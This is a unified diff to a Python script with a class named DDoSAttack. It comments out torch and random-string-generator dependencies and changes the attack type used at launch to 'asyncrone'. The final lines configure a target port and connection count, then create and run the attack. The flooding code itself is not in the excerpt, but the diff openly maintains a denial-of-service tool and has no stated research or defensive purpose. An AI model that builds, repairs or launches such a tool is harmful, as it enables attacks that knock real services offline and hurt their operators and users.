@@ -1,6 +1,6 @@
-import torch
-import torch.nn as nn
-from random_string_generator import RandomStringGenerator
+# import torch
+# import torch.nn as nn
+# from random_string_generator import RandomStringGenerator
 import logging
 import os
 import subprocess
@@ -28,7 +28,7 @@ class DDoSAttack:
         self.num_connections = num_connections
         self.attack_type = attack_type
         self.threads = []
-        self.model = RandomStringGenerator(100)
+        # self.model = RandomStringGenerator(100)
 
     def create_connection(self):
         if self.attack_type == "asyncrone":
@@ -104,6 +104,6 @@ target_port = 80
 num_connections = 1
 
 # Create and launch attack
-attack = DDoSAttack(target_url, target_port, num_connections, "saphyra")
+attack = DDoSAttack(target_url, target_port, num_connections, "asyncrone")
 attack.create_connection()
 attack.wait_for_threads()
